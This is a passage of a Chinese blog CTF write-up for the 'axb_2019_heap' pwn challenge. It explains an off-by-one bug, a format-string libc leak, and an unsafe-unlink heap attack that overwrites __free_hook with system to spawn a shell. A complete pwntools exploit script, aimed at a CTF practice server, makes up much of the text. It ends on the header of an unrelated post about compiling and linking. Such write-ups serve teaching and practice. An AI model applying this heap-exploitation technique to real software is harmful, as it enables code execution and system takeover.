&quot;word&quot;.</span><br><span class="line">pwndbg: loaded 175 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">/home/klose/.gdbinit:14: Error in sourced command file:</span><br><span class="line">This command cannot be used at the top level.</span><br><span class="line">pwndbg&gt; file axb_2019_heap </span><br><span class="line">Reading symbols from axb_2019_heap...(no debugging symbols found)...done.</span><br><span class="line">pwndbg&gt; b banner</span><br><span class="line">Breakpoint 1 at 0xae9</span><br></pre></td></tr></table></figure>
-
-
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;输入’aaaaaaaa’；</p>
-<p><img src="/CTF/PWN/uncategorized/axb-2019-heap/image_2.png"></p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;调试可得：</p>
-<p><img src="/CTF/PWN/uncategorized/axb-2019-heap/image_3.png"></p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<code>__libc_start_main + 240</code>和<code>main</code>在栈上的位置相对于格式化字符串为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%15$p.%19$p</span><br></pre></td></tr></table></figure>
-
-
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;由此可以获得这两个地址；</p>
-<p>&ensp;&ensp;&ensp;&ensp;get_input()函数</p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;在edit_note()函数中存在get_input()函数；</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __fastcall <span class="title">get_input</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (_BYTE *)(v3 + a1);</span><br><span class="line">    result = fread(v4, <span class="number">1uLL</span>, <span class="number">1uLL</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v4 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v3 + a1;</span><br><span class="line">        *v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)++v3;</span><br><span class="line">      <span class="keyword">if</span> ( a2 + <span class="number">1</span> &lt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 )         <span class="comment">// off by one</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;在<code>a2+1≤v3</code>处存在off-by-one漏洞；</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>&ensp;&ensp;&ensp;&ensp;存在off-by-one漏洞，而且对chunk的大小有具体限制，那么可以利用unsafe unlink attack，调用__free_hook钩子以在free的时候调用system函数，至于<code>&#39;/bin/sh&#39;</code>只需要作为一个chunk_content输入就好了；</p>
-<p>&ensp;&ensp;&ensp;&ensp;首先泄露关键地址</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter your name: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;%15$p.%19$p&quot;</span>)</span><br><span class="line">    __libc_start_main_ret = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;840&#x27;</span>)[-<span class="number">14</span>:],<span class="number">16</span>) </span><br><span class="line">    __libc_start_main = __libc_start_main_ret - <span class="number">240</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    main_base = <span class="built_in">int</span>(p.recv()[<span class="number">0</span>:<span class="number">12</span>],<span class="number">16</span>) - <span class="number">0x116a</span></span><br><span class="line">    libc_base = __libc_start_main - <span class="number">0x20750</span></span><br><span class="line">    heap_ptr = main_base + <span class="number">0x202060</span></span><br><span class="line">    __free_hook = libc_base + <span class="number">0x3c67a8</span></span><br><span class="line">    system_addr = libc_base + <span class="number">0x453a0</span></span><br><span class="line">    log.success(<span class="string">&#x27;libc_base =&gt; &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.success(<span class="string">&#x27;__libc_start_main_ret=&gt; &#x27;</span> + <span class="built_in">hex</span>(__libc_start_main_ret))</span><br><span class="line">    log.success(<span class="string">&#x27;__libc_start_main =&gt; &#x27;</span> + <span class="built_in">hex</span>(__libc_start_main))</span><br><span class="line">    log.success(<span class="string">&#x27;main_base =&gt; &#x27;</span> + <span class="built_in">hex</span>(main_base))</span><br><span class="line">    log.success(<span class="string">&#x27;heap_ptr =&gt; &#x27;</span> + <span class="built_in">hex</span>(heap_ptr))</span><br><span class="line">    log.success(<span class="string">&#x27;__free_hook =&gt; &#x27;</span> + <span class="built_in">hex</span>(__free_hook))</span><br><span class="line">    log.success(<span class="string">&#x27;system_addr =&gt; &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br></pre></td></tr></table></figure>
-
-
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;进而获取相关的libc基址等信息；</p>
-<p><img src="/CTF/PWN/uncategorized/axb-2019-heap/image_4.png"></p>
-<p>&ensp;&ensp;&ensp;&ensp;接着构造unsafe unlink attack；</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: \n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: \n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unlink</span>():</span></span><br><span class="line">    show()                            <span class="comment"># 这是为了响应leak时触发的menu</span></span><br><span class="line">    <span class="comment"># add(0, 0x88, &#x27;a&#x27; * 0x90)        # 0x88不合适，因为构造fake chunk的时候，chunk_size为0x80</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x98</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x90</span>)</span><br><span class="line">    <span class="comment"># debug(0)</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x90</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x88</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)         <span class="comment"># system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">    <span class="comment"># debug(0)</span></span><br><span class="line">    </span><br><span class="line">    payload  = p64(<span class="number">0</span>)                   <span class="comment"># fake prev_size</span></span><br><span class="line">    payload += p64(<span class="number">0x91</span>)                <span class="comment"># fake size</span></span><br><span class="line">    payload += p64(heap_ptr - <span class="number">0x18</span>)     <span class="comment"># fake fd</span></span><br><span class="line">    payload += p64(heap_ptr - <span class="number">0x10</span>)     <span class="comment"># fake bk(target)</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">14</span>              <span class="comment"># padding </span></span><br><span class="line">    payload += p64(<span class="number">0x90</span>)                <span class="comment"># fake prev_size</span></span><br><span class="line">    payload += <span class="string">b&#x27;\xa0&#x27;</span>                  <span class="comment"># off-by-one to change PREV_INUSE of next chunk</span></span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    <span class="comment"># debug(0)</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)                           <span class="comment"># trigger unsafe unlink attack</span></span><br><span class="line">    <span class="comment"># debug(0)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;来逐步看看都发生了什么；</p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;在构造fake chunk的时候，要注意以下几点：</p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;1. fake chunk size要符合要求：<code>fake chunk size = chunk0_size - 0x10</code></p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;2. 为了绕过链表前后检查，fd应当设置为<code>target_addr - 0x18</code>，bk设置为<code>target_addr - 0x10</code></p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;3. 为了让glibc认为fake chunk为空，<code>next chunk prev size = fake chunk size - 1</code>，利用off-by-one修改<code>next chunk PREV_INUSE=0</code></p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;因此才构成了上面的payload；</p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<code>delete(1)</code>为触发unsafe unlink attack；</p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;具体的堆布局会如下变化：</p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;1. malloc three chunk</p>
-<p><img src="/CTF/PWN/uncategorized/axb-2019-heap/image_5.png"></p>
-<p><img src="/CTF/PWN/uncategorized/axb-2019-heap/image_6.png"></p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;2. send payload</p>
-<p><img src="/CTF/PWN/uncategorized/axb-2019-heap/image_7.png"></p>
-<p><img src="/CTF/PWN/uncategorized/axb-2019-heap/image_8.png"></p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;3. delete to trigger unsafe unlink</p>
-<p><img src="/CTF/PWN/uncategorized/axb-2019-heap/image_9.png"></p>
-<p><img src="/CTF/PWN/uncategorized/axb-2019-heap/image_10.png"></p>
-<p><img src="/CTF/PWN/uncategorized/axb-2019-heap/image_11.png"></p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;完成后，chunk0_ptr将指向fake_fd，即<code>target_addr - 0x18</code>的位置；</p>
-<p>&ensp;&ensp;&ensp;&ensp;接着进行pwn操作；</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">3</span> + p64(__free_hook) + p64(<span class="number">0x10</span>))</span><br><span class="line">    <span class="comment"># debug(0)</span></span><br><span class="line">    edit(<span class="number">0</span>, p64(system_addr))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="/CTF/PWN/uncategorized/axb-2019-heap/image_12.png"></p>
-<p><img src="/CTF/PWN/uncategorized/axb-2019-heap/image_13.png"></p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;这样修改过后，由于chunk0_ptr = chunk0_ptr[3] = __free_hook_addr，只需要在chunk0_ptr处填充system_addr，则可以实现__free_hook内容被修改为system_addr；</p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;调用即可得到shell；</p>
-<p><img src="/CTF/PWN/uncategorized/axb-2019-heap/image_14.png"></p>
-<p>&ensp;&ensp;&ensp;&ensp;exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> glob <span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">proc_name = <span class="string">&#x27;axb_2019_heap&#x27;</span></span><br><span class="line">islocal = <span class="number">1</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(proc_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> islocal:</span><br><span class="line">    p = process(proc_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28198</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">addr, PIE=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: \n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: \n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>():</span></span><br><span class="line">    <span class="keyword">global</span> heap_ptr</span><br><span class="line">    <span class="keyword">global</span> __free_hook</span><br><span class="line">    <span class="keyword">global</span> system_addr</span><br><span class="line">    <span class="keyword">global</span> main_base</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter your name: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;%15$p.%19$p&quot;</span>)</span><br><span class="line">    <span class="comment"># __libc_start_main_ret = int(p.recvuntil(&#x27;840&#x27;)[-14:],16)      # local </span></span><br><span class="line">    __libc_start_main_ret = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;830&#x27;</span>)[-<span class="number">14</span>:],<span class="number">16</span>)</span><br><span class="line">    __libc_start_main = __libc_start_main_ret - <span class="number">240</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    main_base = <span class="built_in">int</span>(p.recv()[<span class="number">0</span>:<span class="number">12</span>],<span class="number">16</span>) - <span class="number">0x116a</span></span><br><span class="line">    <span class="comment"># libc_base = __libc_start_main - 0x20840                       # local</span></span><br><span class="line">    libc_base = __libc_start_main - <span class="number">0x20740</span></span><br><span class="line">    heap_ptr = main_base + <span class="number">0x202060</span></span><br><span class="line">    __free_hook = libc_base + <span class="number">0x3c67a8</span></span><br><span class="line">    <span class="comment"># system_addr = libc_base + 0x453a0     # local</span></span><br><span class="line">    system_addr = libc_base + <span class="number">0x45390</span></span><br><span class="line">    log.success(<span class="string">&#x27;libc_base =&gt; &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.success(<span class="string">&#x27;__libc_start_main_ret=&gt; &#x27;</span> + <span class="built_in">hex</span>(__libc_start_main_ret))</span><br><span class="line">    log.success(<span class="string">&#x27;__libc_start_main =&gt; &#x27;</span> + <span class="built_in">hex</span>(__libc_start_main))</span><br><span class="line">    log.success(<span class="string">&#x27;main_base =&gt; &#x27;</span> + <span class="built_in">hex</span>(main_base))</span><br><span class="line">    log.success(<span class="string">&#x27;heap_ptr =&gt; &#x27;</span> + <span class="built_in">hex</span>(heap_ptr))</span><br><span class="line">    log.success(<span class="string">&#x27;__free_hook =&gt; &#x27;</span> + <span class="built_in">hex</span>(__free_hook))</span><br><span class="line">    log.success(<span class="string">&#x27;system_addr =&gt; &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unlink</span>():</span></span><br><span class="line">    show()</span><br><span class="line">    <span class="comment"># add(0, 0x88, &#x27;a&#x27; * 0x90)        # 0x88不合适，因为构造fake chunk的时候，chunk_size为0x80</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x98</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x90</span>)</span><br><span class="line">    <span class="comment"># debug(0)</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x90</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x88</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)         <span class="comment"># system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">    <span class="comment"># debug(0)</span></span><br><span class="line">    </span><br><span class="line">    payload  = p64(<span class="number">0</span>)                   <span class="comment"># fake prev_size</span></span><br><span class="line">    payload += p64(<span class="number">0x91</span>)                <span class="comment"># fake size</span></span><br><span class="line">    payload += p64(heap_ptr - <span class="number">0x18</span>)     <span class="comment"># fake fd</span></span><br><span class="line">    payload += p64(heap_ptr - <span class="number">0x10</span>)     <span class="comment"># fake bk(target)</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">14</span>              <span class="comment"># padding </span></span><br><span class="line">    payload += p64(<span class="number">0x90</span>)                <span class="comment"># fake prev_size</span></span><br><span class="line">    payload += <span class="string">b&#x27;\xa0&#x27;</span>                  <span class="comment"># off-by-one to change PREV_INUSE of next chunk</span></span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    <span class="comment"># debug(0)</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)                           <span class="comment"># trigger unsafe unlink attack</span></span><br><span class="line">    <span class="comment"># debug(0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">3</span> + p64(__free_hook) + p64(<span class="number">0x10</span>))</span><br><span class="line">    <span class="comment"># debug(0)</span></span><br><span class="line">    edit(<span class="number">0</span>, p64(system_addr))</span><br><span class="line">    <span class="comment"># debug(0)</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    leak()</span><br><span class="line">    unlink()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
-
-<p>连buu的时候要注意libc的问题；</p>
-
-        
-        
-          <blockquote id="copyright">
-              <p>原文链接: <a href="https://www.jk404.cn/page/9/index.html">https://www.jk404.cn/page/9/index.html</a></p>
-              <p>版权声明: 转载请注明出处.</p>
-          </blockquote>
-        
-      
-    </div>
-    <footer class="article-footer">
-      
-        <div class="article-tag-wrap">
-          
-
-          
-          
-
-
-        </div>
-      
-      
-      
-    </footer>
-  </div>
-</article>
-
-
-  <article id="post-compile与link" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/compile%E4%B8%8Elink/">compile与link</a>
-    </h1>
-  
-
-
-      </header>
-    
-    <div class="article-meta">
-      
-      <span class="article-date">
-  <i class="fa fa-date"></i>
-  <time class="dt-published" datetime="2021-10-24T04:42:46.000Z" itemprop="datePublished">2021年10月24日</time>
-</span>
-      
-  <div class="article-category">
-    <i class="fa fa-classify"></i>
